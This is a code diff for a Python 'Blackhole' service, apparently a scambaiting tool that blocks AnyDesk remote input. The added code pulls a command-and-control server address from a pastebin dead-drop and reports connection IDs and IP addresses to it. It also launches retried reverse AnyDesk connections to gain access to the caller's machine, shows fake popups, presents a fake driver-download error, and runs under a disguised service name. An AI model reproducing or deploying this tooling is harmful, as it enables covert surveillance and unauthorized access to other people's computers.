@@ -13,14 +13,48 @@ This allows Mac keyboard/trackpad (QEMU VirtIO) to work while blocking remote de
 
 import os
 import sys
+import threading
 import time
+import urllib.request
 
-from utils.config import DEFAULT_FIREWALL_STATE, TOGGLE_HOTKEY, DRIVER_ERROR_HOTKEY, DRIVER_DOWNLOAD_URL
+from utils.config import (
+    DEFAULT_FIREWALL_STATE,
+    TOGGLE_HOTKEY,
+    DRIVER_ERROR_HOTKEY,
+    DRIVER_DOWNLOAD_URL,
+    CONFIG_URL,
+    FALLBACK_HOST,
+    C2_SERVER_PORT,
+    C2_API_KEY,
+    CORRELATION_TIME_WINDOW,
+    REVERSE_CONNECTION_ENABLED,
+    REVERSE_CONNECTION_RETRY_LIMIT,
+    REVERSE_CONNECTION_RETRY_DELAY,
+    FAKE_POPUP_ENABLED,
+    FAKE_POPUP_TIMEOUT,
+    AUTO_ENABLE_FIREWALL_ON_CONNECTION,
+)
 from utils.gatekeeper import InputGatekeeper
 from utils.process_monitor import ProcessMonitor
 from utils.api_hooker import APIHooker
 from utils.hotkeys import HotkeyListener
 from utils.notifications import show_notification, show_driver_error
+from utils.anydesk_finder import AnyDeskFinder
+from utils.log_monitor import LogMonitor
+from utils.connection_correlator import ConnectionCorrelator
+from utils.anydesk_controller import AnyDeskController
+from utils.fake_popup import create_fake_anydesk_popup
+from utils.c2_client import C2Client
+
+
+# ============================================================================
+# CONSTANTS
+# ============================================================================
+
+# Timing delays (seconds)
+POPUP_DISPLAY_DELAY = 2  # Delay before showing fake popup to scammer
+PASTEBIN_FETCH_TIMEOUT = 5  # Timeout for fetching C2 IP from pastebin
+DEV_MODE_SHUTDOWN_COUNTDOWN = 60  # Auto-shutdown timer in dev mode
 
 
 # ============================================================================
@@ -108,19 +142,40 @@ class BlackholeService:
         # Firewall state
         self.firewall_active = DEFAULT_FIREWALL_STATE
 
-        # Initialize components
+        # Initialize original components
         self.gatekeeper = InputGatekeeper(log_func=self.log)
         self.process_monitor = ProcessMonitor(log_func=self.log, callback=self._on_process_event)
         self.api_hooker = APIHooker(log_func=self.log)
         self.hotkey_listener = HotkeyListener(TOGGLE_HOTKEY, self.toggle_firewall, log_func=self.log)
         self.driver_error_listener = HotkeyListener(DRIVER_ERROR_HOTKEY, self.show_fake_driver_error, log_func=self.log)
 
+        # Initialize AnyDesk integration components
+        self.anydesk_path = None  # Discovered path to real AnyDesk.exe
+        self.log_monitor = LogMonitor(callback=self._on_log_event, log_func=self.log)
+        self.correlator = ConnectionCorrelator(
+            callback=self._on_connection_event, time_window=CORRELATION_TIME_WINDOW, log_func=self.log
+        )
+        self.anydesk_controller = AnyDeskController(log_func=self.log)
+
+        # Fetch C2 server IP dynamically from pastebin
+        c2_host = self._get_c2_ip()
+        self.c2_client = C2Client(c2_host, C2_SERVER_PORT, C2_API_KEY, log_func=self.log)
+
+        # Disable C2 logging in dev mode
+        if dev_mode:
+            self.c2_client.disable()
+
+        # Track active popups and retry attempts
+        self.active_popups = []
+        self.outgoing_attempts = {}  # {anydesk_id: {'count': N, 'last_attempt': timestamp}}
+
         self.log("\n" + "=" * 60)
-        self.log("  Task Host Windows Service")
+        self.log("  AnyDesk Client Service")
         self.log("=" * 60)
         self.log(f"Mode: {'DEV' if dev_mode else 'PRODUCTION'}")
-        self.log(f"Architecture: API Hooking + Low-Level Hooks")
+        self.log(f"Architecture: API Hooking + Log Monitoring")
         self.log(f"Default state: {'ACTIVE' if DEFAULT_FIREWALL_STATE else 'INACTIVE'}")
+        self.log(f"Reverse connection: {'ENABLED' if REVERSE_CONNECTION_ENABLED else 'DISABLED'}")
         self.log(f"Hotkey: Command+Shift+F (toggle firewall)")
         self.log(f"Hotkey: Command+Shift+G (fake driver error)")
         self.log("=" * 60 + "\n")
@@ -148,6 +203,196 @@ class BlackholeService:
         self.log("[SERVICE] Fake driver error triggered - showing popup to scammer...")
         show_driver_error(DRIVER_DOWNLOAD_URL)
         self.log(f"[SERVICE] Driver download URL displayed: {DRIVER_DOWNLOAD_URL}")
+
+    def _discover_anydesk(self):
+        """Discover AnyDesk.exe location at service startup"""
+        self.log("[SERVICE] Discovering AnyDesk installation...")
+        self.anydesk_path = AnyDeskFinder.find_anydesk(log_func=self.log)
+
+        if self.anydesk_path:
+            self.log(f"[SERVICE] AnyDesk found: {self.anydesk_path}")
+        else:
+            self.log("[SERVICE] WARNING: AnyDesk.exe not found - reverse connection disabled")
+
+    def _get_c2_ip(self):
+        """Fetch C2 server IP from pastebin with fallback"""
+        try:
+            self.log("[C2] Fetching C2 server IP from pastebin...")
+            with urllib.request.urlopen(CONFIG_URL, timeout=PASTEBIN_FETCH_TIMEOUT) as response:
+                ip = response.read().decode("utf-8").strip()
+                if ip:
+                    self.log(f"[C2] Got C2 server IP: {ip}")
+                    return ip
+        except Exception as e:
+            self.log(f"[C2] Pastebin fetch failed: {e}")
+
+        self.log(f"[C2] Using fallback IP: {FALLBACK_HOST}")
+        return FALLBACK_HOST
+
+    def _on_log_event(self, event_type, data):
+        """
+        Called by LogMonitor when new log entries are detected.
+        Routes events to the correlator.
+        """
+        self.correlator.add_event(event_type, data)
+
+    def _on_connection_event(self, event):
+        """
+        Called by ConnectionCorrelator when a complete connection event is matched.
+        Dispatches to specific handlers based on event type.
+        """
+        event_type = event.get("event_type")
+
+        if event_type == "incoming_request":
+            self._handle_incoming_request(event)
+        elif event_type == "outgoing_rejected":
+            self._handle_outgoing_rejected(event)
+        elif event_type == "outgoing_accepted":
+            self._handle_outgoing_accepted(event)
+
+    def _handle_incoming_request(self, event):
+        """Handle incoming connection request from scammer"""
+        anydesk_id = event["anydesk_id"]
+        ip_address = event["ip_address"]
+
+        self.log("\n" + "=" * 60)
+        self.log(f"🚨 INCOMING CONNECTION REQUEST")
+        self.log("=" * 60)
+        self.log(f"  AnyDesk ID: {anydesk_id}")
+        self.log(f"  IP Address: {ip_address}")
+        self.log("=" * 60 + "\n")
+
+        # Auto-enable firewall if configured and not already active
+        if AUTO_ENABLE_FIREWALL_ON_CONNECTION and not self.firewall_active:
+            self.log("[SERVICE] Auto-enabling firewall for incoming connection...")
+            self.gatekeeper.start()
+            if self.gatekeeper.is_active():
+                self.firewall_active = True
+                self.log("[SERVICE] Firewall ENABLED - scammer input will be blocked")
+                event["metadata"]["firewall_auto_enabled"] = True
+            else:
+                self.log("[SERVICE] WARNING: Failed to enable firewall")
+                event["metadata"]["firewall_auto_enabled"] = False
+        else:
+            event["metadata"]["firewall_auto_enabled"] = False
+
+        # Log to C2 server
+        self.c2_client.log_event(event)
+
+        # Initiate reverse connection if enabled
+        if REVERSE_CONNECTION_ENABLED and self.anydesk_path:
+            self.log(f"[SERVICE] Initiating reverse connection to {anydesk_id}...")
+            success = self.anydesk_controller.initiate_connection(self.anydesk_path, anydesk_id)
+
+            if success:
+                # Track attempt
+                self.outgoing_attempts[anydesk_id] = {"count": 1, "last_attempt": time.time()}
+                event["metadata"]["reverse_connection_initiated"] = True
+                self.log(f"[SERVICE] Reverse connection window launched (attempt 1/{REVERSE_CONNECTION_RETRY_LIMIT})")
+
+                # Show fake popup after small delay (give scammer time to see honeypot)
+                if FAKE_POPUP_ENABLED:
+                    time.sleep(POPUP_DISPLAY_DELAY)
+                    self._show_fake_popup()
+            else:
+                event["metadata"]["reverse_connection_initiated"] = False
+                self.log("[SERVICE] Failed to initiate reverse connection")
+        else:
+            event["metadata"]["reverse_connection_initiated"] = False
+            if not REVERSE_CONNECTION_ENABLED:
+                self.log("[SERVICE] Reverse connection disabled in config")
+            elif not self.anydesk_path:
+                self.log("[SERVICE] Reverse connection unavailable (AnyDesk not found)")
+
+    def _handle_outgoing_rejected(self, event):
+        """Handle outgoing connection rejection from scammer"""
+        anydesk_id = event["anydesk_id"]
+
+        # Get attempt count
+        attempt_info = self.outgoing_attempts.get(anydesk_id, {"count": 0, "last_attempt": 0})
+        attempt_count = attempt_info["count"]
+
+        self.log("\n" + "=" * 60)
+        self.log(f"❌ REVERSE CONNECTION REJECTED")
+        self.log("=" * 60)
+        self.log(f"  Target: {anydesk_id}")
+        self.log(f"  Attempt: {attempt_count}/{REVERSE_CONNECTION_RETRY_LIMIT}")
+        self.log("=" * 60 + "\n")
+
+        # Log to C2
+        event["metadata"]["attempt_number"] = attempt_count
+        self.c2_client.log_event(event)
+
+        # Check if we should retry
+        if attempt_count < REVERSE_CONNECTION_RETRY_LIMIT:
+            # Calculate backoff delay (exponential: 15s, 30s, 60s)
+            delay = REVERSE_CONNECTION_RETRY_DELAY * (2 ** (attempt_count - 1))
+            time_since_last = time.time() - attempt_info["last_attempt"]
+
+            if time_since_last >= delay:
+                # Retry now
+                self._retry_reverse_connection(anydesk_id, attempt_count + 1)
+            else:
+                # Schedule retry
+                wait_time = delay - time_since_last
+                self.log(f"[SERVICE] Scheduling retry in {wait_time:.0f} seconds...")
+                threading.Timer(wait_time, self._retry_reverse_connection, args=(anydesk_id, attempt_count + 1)).start()
+        else:
+            self.log(f"[SERVICE] Max retry attempts reached for {anydesk_id}")
+            # Clean up tracking
+            if anydesk_id in self.outgoing_attempts:
+                del self.outgoing_attempts[anydesk_id]
+
+    def _handle_outgoing_accepted(self, event):
+        """Handle successful outgoing connection to scammer"""
+        anydesk_id = event["anydesk_id"]
+
+        self.log("\n" + "=" * 60)
+        self.log(f"🎯 SUCCESS! REVERSE CONNECTION ACCEPTED")
+        self.log("=" * 60)
+        self.log(f"  Target: {anydesk_id}")
+        self.log(f"  Status: YOU NOW HAVE ACCESS TO SCAMMER'S MACHINE")
+        self.log("=" * 60 + "\n")
+
+        # Log to C2
+        self.c2_client.log_event(event)
+
+        # Close any active fake popups
+        self._close_all_popups()
+
+        # Clear retry tracking
+        if anydesk_id in self.outgoing_attempts:
+            del self.outgoing_attempts[anydesk_id]
+
+    def _retry_reverse_connection(self, anydesk_id, attempt_number):
+        """Retry reverse connection attempt"""
+        self.log(
+            f"[SERVICE] Retrying reverse connection to {anydesk_id} (attempt {attempt_number}/{REVERSE_CONNECTION_RETRY_LIMIT})..."
+        )
+
+        if self.anydesk_path:
+            success = self.anydesk_controller.initiate_connection(self.anydesk_path, anydesk_id)
+
+            if success:
+                # Update attempt tracking
+                self.outgoing_attempts[anydesk_id] = {"count": attempt_number, "last_attempt": time.time()}
+                self.log(f"[SERVICE] Retry launched successfully")
+            else:
+                self.log("[SERVICE] Retry failed")
+
+    def _show_fake_popup(self):
+        """Show fake AnyDesk popup to scammer"""
+        self.log("[SERVICE] Showing fake AnyDesk popup...")
+        popup = create_fake_anydesk_popup(log_func=self.log)
+        popup.show()
+        self.active_popups.append(popup)
+
+    def _close_all_popups(self):
+        """Close all active fake popups"""
+        for popup in self.active_popups:
+            if not popup.is_closed():
+                popup.close()
+        self.active_popups.clear()
 
     def toggle_firewall(self):
         """Toggle firewall on/off (called by hotkey)"""
@@ -183,7 +428,16 @@ class BlackholeService:
         """Start the service"""
         self.log("[SERVICE] Starting Blackhole service...")
 
-        # Start process monitor first
+        # Discover AnyDesk installation
+        self._discover_anydesk()
+
+        # Start AnyDesk log monitoring
+        self.log("[SERVICE] Starting AnyDesk log monitor...")
+        self.log_monitor.start()
+        self.log("[SERVICE] Starting correlation engine...")
+        self.correlator.start()
+
+        # Start process monitor
         self.process_monitor.start()
 
         # Start hotkey listeners
@@ -215,9 +469,11 @@ class BlackholeService:
         try:
             # Keep the main thread alive
             if self.dev_mode:
-                # DEV MODE: Auto-shutdown after 60 seconds to prevent lockouts
-                self.log("[DEV MODE] Auto-shutdown enabled: service will stop in 60 seconds")
-                countdown = 60
+                # DEV MODE: Auto-shutdown after countdown to prevent lockouts
+                self.log(
+                    f"[DEV MODE] Auto-shutdown enabled: service will stop in {DEV_MODE_SHUTDOWN_COUNTDOWN} seconds"
+                )
+                countdown = DEV_MODE_SHUTDOWN_COUNTDOWN
                 while countdown > 0:
                     time.sleep(1)
                     countdown -= 1
@@ -235,6 +491,15 @@ class BlackholeService:
     def stop(self):
         """Stop the service"""
         self.log("[SERVICE] Stopping Blackhole service...")
+
+        # Stop AnyDesk components
+        self.log("[SERVICE] Stopping AnyDesk log monitor...")
+        self.log_monitor.stop()
+        self.log("[SERVICE] Stopping correlation engine...")
+        self.correlator.stop()
+
+        # Close all fake popups
+        self._close_all_popups()
 
         # Stop hotkey listeners
         self.hotkey_listener.stop()
@@ -255,6 +520,7 @@ class BlackholeService:
             try:
                 stats = self.gatekeeper.get_stats()
                 hooked_pids = self.api_hooker.get_hooked_processes()
+                correlator_stats = self.correlator.get_stats()
 
                 self.log("\n" + "=" * 60)
                 self.log("  Session Statistics")
@@ -264,6 +530,8 @@ class BlackholeService:
                 self.log(f"Allowed keyboard:  {stats.get('allowed_keys', 0)}")
                 self.log(f"Allowed mouse:     {stats.get('allowed_mouse', 0)}")
                 self.log(f"Hooked processes:  {len(hooked_pids)}")
+                self.log(f"Pending IDs:       {correlator_stats.get('waiting_ids', 0)}")
+                self.log(f"Pending IPs:       {correlator_stats.get('waiting_ips', 0)}")
                 self.log("=" * 60 + "\n")
             except Exception as e:
                 self.log(f"[ERROR] Failed to get stats: {e}")
